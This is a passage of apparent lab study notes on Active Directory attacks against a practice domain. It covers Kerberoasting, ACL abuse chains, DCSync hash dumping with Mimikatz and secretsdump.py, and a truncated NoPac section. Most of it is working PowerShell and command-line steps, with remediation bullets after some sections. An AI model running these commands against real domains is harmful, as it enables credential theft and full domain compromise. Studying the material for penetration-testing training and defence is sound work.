Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
# → Quick list of all Kerberoastable accounts

# Get TGS in Hashcat format for a specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
# → Returns hash in $krb5tgs$ format ready for Hashcat

# Export all TGS tickets to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
# → Bulk collection in one command
# NEXT: Crack all hashes in the CSV

Remediation for Kerberoasting

  • Use strong, complex passwords (25+ chars) for service accounts
  • Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA) — passwords auto-rotate
  • Audit accounts with SPNs — remove unnecessary ones
  • Enable AES encryption for Kerberos (remove RC4 support)
  • Monitor Event ID 4769 (Kerberos service ticket request) for unusual patterns

🔐 ACL Enumeration & Attacks

ACLs (Access Control Lists) define what actions a security principal can take on an AD object.

Types of ACLs

  • DACL (Discretionary ACL): Defines who can access an object. Made of ACEs (Access Control Entries)
  • SACL (System ACL): Defines what access attempts are audited/logged

Types of ACEs

ACE Type Description
Access Denied ACE Explicitly denies access
Access Allowed ACE Explicitly grants access
System Audit ACE Logs access attempts

High-Value ACE Rights to Abuse

Right What You Can Do
ForceChangePassword Reset a user's password without knowing the current one
GenericAll Full control — change password, add to groups, modify attributes
GenericWrite Modify non-protected attributes (e.g., set SPN for Kerberoasting)
WriteOwner Change object ownership — then grant yourself full control
WriteDACL Modify the DACL — grant yourself any right
AllExtendedRights All extended rights including ForceChangePassword, DCSync
AddMember Add members to a group
Self Add yourself to a group (if Self-Membership is granted)

Enumerating ACLs with PowerView

# Find all non-default/interesting ACLs
Find-InterestingDomainAcl
# → Searches for non-built-in ACEs — often reveals misconfigurations
# NEXT: Review each hit — who has rights over what?

# Get SID for a specific user
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
# → Converts username to SID for use in ACL queries
# NEXT: Use $sid to filter ACL results

# Find all objects that user 'wley' has rights over
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# → Returns: ObjectDN, ActiveDirectoryRights, ObjectAceType for user's SID
# → Look for: ForceChangePassword, GenericAll, WriteProperty, etc.

# Same but resolve GUIDs to human-readable names
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# → -ResolveGUIDs = translate GUIDs to meaningful right names
# → Much easier to read than raw GUIDs

# Look up what a specific GUID means
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
# → Reverse-lookup a GUID to find its human-readable name
# → Useful when -ResolveGUIDs doesn't work or for verification

# Enumerate ACLs for all domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access |
    Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}
# → Loops through all users, checks ACL for wley's rights over each
# → Comprehensive ACL audit for a specific user

Performing ACL Attacks

Scenario: wley has ForceChangePassword over damundsen. damundsen has GenericWrite over "Help Desk Level 1" group. The group has GenericAll over the adunn user.

# Step 1: Create PSCredential object (for wley)
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
# → Stores credentials for use in other commands
# → Needed because we're running commands in context of a different user

# Step 2: Change damundsen's password (ForceChangePassword right)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
# → Uses wley's ForceChangePassword right to change damundsen's password
# → No knowledge of current password required
# NEXT: Authenticate as damundsen with new password

# Step 3: View Help Desk Level 1 group members
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
# → Confirm current membership before adding ourselves

# Step 4: Add damundsen to "Help Desk Level 1" (GenericWrite on group)
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
# → damundsen has GenericWrite = can add members
# → Now damundsen is in Help Desk Level 1

# Step 5: Verify membership
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Step 6: Create fake SPN on adunn for Kerberoasting (GenericAll via group)
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# → GenericAll = can set any attribute, including SPN
# → Now adunn has an SPN = can be Kerberoasted
# NEXT: Kerberoast adunn, crack the TGS, get plaintext password

# Step 7: Clean up — remove fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Step 8: Remove damundsen from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# Convert SDDL string to readable format
ConvertFrom-SddlString "O:BAG:BAD:..."
# → SDDL = Security Descriptor Definition Language — hard to read raw
# → This cmdlet converts to human-readable format

🔄 DCSync Attack

DCSync mimics a Domain Controller's replication behavior to steal password hashes from the AD database without needing to log on to the DC directly.

How It Works

  1. Attacker sends a DS-Replication-Get-Changes-All request to the DC
  2. DC thinks another DC is asking to replicate passwords (normal DC-to-DC behavior)
  3. DC responds with NTLM hashes for all requested accounts
  4. Attacker gets NTLM hashes without touching ntds.dit directly

Requirements

The account performing DCSync must have:
- Replicating Directory Changes permission
- Replicating Directory Changes All permission

By default: Domain Admins, Enterprise Admins, and Domain Controllers have these rights. But sometimes other accounts are misconfigured with these permissions.

Check for Replication Rights

# Check if a user has DCSync rights
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
# → Check if they're in a privileged group or have direct rights

# Verify replication ACEs
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
# → Confirms if the SID has Replication-Get-Changes rights
# → If AccessAllowed for DS-Replication-Get-Changes = can DCSync

DCSync with Mimikatz (Windows)

# Dump single user hash
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
# → Requests replication of the administrator account
# → Returns: NTLM hash, NTHash, AES keys, and more
# NEXT: Use NTLM hash for pass-the-hash or crack it

# Dump KRBTGT (Golden Ticket creation)
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
# → KRBTGT hash = can create Golden Tickets for any user
# → Ultimate persistence mechanism

DCSync with secretsdump.py (Linux)

# Dump all hashes from the domain
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss
# → -outputfile = save to file | -just-dc = only DC secrets
# → -use-vss = use Volume Shadow Copy (alternative extraction method)
# → Creates: inlanefreight_hashes.ntds (all user hashes)
# → NTLM hashes in format: user:RID:LMhash:NThash:::
# NEXT: Crack any desired hashes with Hashcat, or use for pass-the-hash

# Extract hashes using captured hash (not cleartext)
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
# → -hashes = LMhash:NThash (use 'aad3c...' for empty LM hash)

DCSync Remediation

  • Audit who has Replication rights on the domain object
  • Remove unnecessary replication permissions
  • Monitor Event IDs: 4662 (object operation) with DS-Replication-Get-Changes-All

💀 NoPac (Sam The Admin — CVE-2021-42278/42287)

# → -shell = get interactive shell
# → --impersonate administrator = impersonate the built-in Administrator
# → -use-ldap = use LDAP for machine account creation
